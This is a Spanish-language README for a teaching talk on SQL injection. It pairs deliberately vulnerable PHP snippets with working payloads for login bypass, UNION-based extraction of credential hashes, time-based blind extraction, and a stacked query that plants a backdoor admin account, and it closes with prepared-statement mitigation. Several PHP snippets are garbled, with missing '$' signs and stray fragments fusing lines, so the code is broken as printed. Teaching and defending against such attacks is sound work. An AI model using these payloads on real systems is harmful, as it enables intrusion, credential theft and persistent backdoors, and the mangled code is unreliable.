# 🎤 Charla Técnica: Anatomía del SQL Injection (SQLi)

Este repositorio contiene la guía estructurada, ejemplos de código y payloads para la presentación de 15 minutos sobre vulnerabilidades de SQL Injection. El objetivo es demostrar de forma práctica cómo los fallos de sanitización permiten a un atacante saltarse pantallas de autenticación, extraer datos confidenciales y comprometer bases de datos por completo.

---

## ⏱️ Cronograma y Estructura de la Charla (15 Minutos)

*   **00:00 - 02:00** | Introducción y Analogía del Mundo Real (La confianza ciega).
*   **02:00 - 05:00** | **Nivel 1:** Evasión de Autenticación (Forzado de Login).
*   **05:00 - 08:00** | **Nivel 2:** Inyección Basada en Unión (Extracción Visual).
*   **08:00 - 11:00** | **Nivel 3:** Inyección a Ciegas (Time-Based Blind SQLi).
*   **11:00 - 13:00** | **Nivel 4:** Consultas Apiladas (Modificación y Persistencia).
*   **13:00 - 15:00** | **Mitigación:** Consultas Preparadas (Prepared Statements) y Conclusión.

---

## 🟢 Nivel 1: Evasión de Autenticación (Forzado de Login)
*Objetivo: Demostrar cómo saltarse un formulario de inicio de sesión sin conocer las credenciales.*

### 🖥️ Código Vulnerable (PHP)
```php
user = _POST['username'];
pass = _POST['password'];

// Concatenación directa de variables en la cadena SQL
\$sql = "SELECT * FROM usuarios WHERE username = 'user' AND password = 'pass'";
\$result = conexion->query(sql);
```

### 🪓 Payload
```sql
admin' OR '1'='1
```

### ⚙️ Consulta Resultante en el Motor
```sql
SELECT * FROM usuarios WHERE username = 'admin' OR '1'='1' AND password = ''
```
*   **Explicación:** La comilla simple (`'`) cierra la cadena del desarrollador. El operador `OR '1'='1'` fuerza una condición matemática que siempre es verdadera (`TRUE`). El motor de la base de datos ignora la contraseña y otorga acceso al primer registro encontrado (el administrador).

---

## 🟡 Nivel 2: Inyección Basada en Unión (UNION-Based)
*Objetivo: Utilizar un parámetro público de búsqueda para extraer datos de otras tablas de la base de datos.*

### 🖥️ Código Vulnerable (PHP)
```php
// Parámetro recibido directamente desde la URL (?id=4)
\$id_articulo = \(_GET['id'];\)sql = "SELECT id, nombre, precio FROM productos WHERE id = " . \$id_articulo;
```

### 🪓 Payloads (Ataque en 2 Pasos)
1. **Paso A (Enumeración de columnas):**
   ```sql
   4 ORDER BY 4 -- -
   ```
   *(Si arroja error, significa que la consulta original tiene menos de 4 columnas. Se reduce el número hasta encontrar el límite exacto, en este caso: 3 columnas).*

2. **Paso B (Extracción de datos):**
   ```sql
   -1 UNION SELECT 1, nombre_usuario, clave_hash FROM credenciales -- -
   ```

### ⚙️ Consulta Resultante en el Motor
```sql
SELECT id, nombre, precio FROM productos WHERE id = -1 UNION SELECT 1, nombre_usuario, clave_hash FROM credenciales -- -
```
*   **Explicación:** Al forzar el ID a `-1`, la consulta de productos no devuelve registros. El operador `UNION` obliga al servidor a rellenar la respuesta visual con los datos confidenciales provenientes de la tabla `credenciales`.

---

## 🟠 Nivel 3: Inyección a Ciegas por Tiempo (Time-Based Blind)
*Objetivo: Extraer información cuando la aplicación web no muestra errores de SQL ni pinta datos en la pantalla.*

### 🖥️ Código Vulnerable (PHP)
```php
\$id_articulo = \(_GET['id'];\)sql = "SELECT * FROM articulos WHERE id = '\$id_articulo'";
\$result = conexion->query(sql);

// La interfaz solo responde de manera genérica booleanamente
if (\$result->num_rows > 0) { echo "Disponible"; } else { echo "No disponible"; }
```

### 🪓 Payload Condicional
```sql
1' AND IF(SUBSTRING((SELECT username FROM usuarios LIMIT 1), 1, 1) = 'a', SLEEP(5), 0) -- -
```

### ⚙️ Consulta Resultante en el Motor
```sql
SELECT * FROM articulos WHERE id = '1' AND IF(SUBSTRING((SELECT username FROM usuarios LIMIT 1), 1, 1) = 'a', SLEEP(5), 0) -- -
```
*   **Explicación:** El atacante usa un canal lateral (el tiempo). La función `SUBSTRING` extrae el primer carácter del usuario. Si la letra es una `'a'`, la condición `IF` activa un `SLEEP(5)`, congelando la respuesta del servidor por 5 segundos. Si el navegador tarda ese tiempo en responder, el atacante confirma el dato de forma remota.

---

## 🔴 Nivel 4: Consultas Apiladas (Stacked Queries)
*Objetivo: Ir más allá de la lectura de datos, ejecutando comandos de escritura para persistir en el servidor.*

### 🖥️ Código Vulnerable (PHP)
```php
\$categoria = \(_GET['cat'];\)sql = "SELECT * FROM productos WHERE categoria = '\$categoria'";

// Uso de funciones que permiten múltiples instrucciones separadas por ';'
\(conexion->multi_query(\)sql);
```

### 🪓 Payload de Persistencia (Backdoor)
```sql
libros'; INSERT INTO usuarios (username, password, rol) VALUES ('backdoor_user', 'ClaveSegura99#', 'admin'); --
```

### ⚙️ Consulta Resultante en el Motor
```sql
SELECT * FROM productos WHERE categoria = 'libros'; INSERT INTO usuarios (username, password, rol) VALUES ('backdoor_user', 'ClaveSegura99#', 'admin'); --'
```
*   **Explicación:** El punto y coma (`;`) actúa como un terminador de sentencias. El motor ejecuta la consulta de búsqueda, la finaliza de golpe, y posteriormente procesa de forma independiente la instrucción `INSERT`. Esto introduce un nuevo usuario administrador en el disco físico del servidor permanentemente.

---

## 🛡️ La Solución Definitiva: Consultas Preparadas

Intentar limpiar cadenas con filtros caseros o funciones de escape manual (`mysqli_real_escape_string`) suele fallar ante codificaciones complejas. La única mitigación definitiva es **separar el código de los datos** utilizando Consultas Preparadas (Prepared Statements).

### 📝 Código Seguro (Uso de PDO en PHP)
```php
// 1. Se pre-compila la estructura de la consulta en el motor SQL
stmt = pdo->prepare('SELECT * FROM usuarios WHERE username = :user AND password = :pass');

// 2. Los datos proporcionados por el usuario se pasan de forma aislada como parámetros
\$stmt->execute([
    'user' => \$_POST['username'],
    'pass' => \$_POST['password']
]);
```
Al aplicar este estándar, cualquier intento de payload como `' OR '1'='1` será tratado únicamente como una cadena de texto literal (un string simple) dentro del campo de búsqueda y **jamás** será interpretado ni ejecutado como código del sistema.

---

## 📝 Conclusiones para la Audiencia
1. El impacto de SQL Injection no se limita a evadir pantallas de login; abarca exfiltración exhaustiva de datos y control total del servidor de base de datos.
2. Los mensajes de error del sistema deben estar desactivados en entornos de producción, ya que facilitan la etapa de reconocimiento del atacante.
3. Las herramientas automatizadas (como SQLMap) aprovechan las inyecciones a ciegas (Blind SQLi) para clonar bases de datos enteras a través de peticiones masivas en pocos minutos.
4. Las consultas preparadas son obligatorias en el desarrollo moderno de software para anular esta vulnerabilidad por diseño.
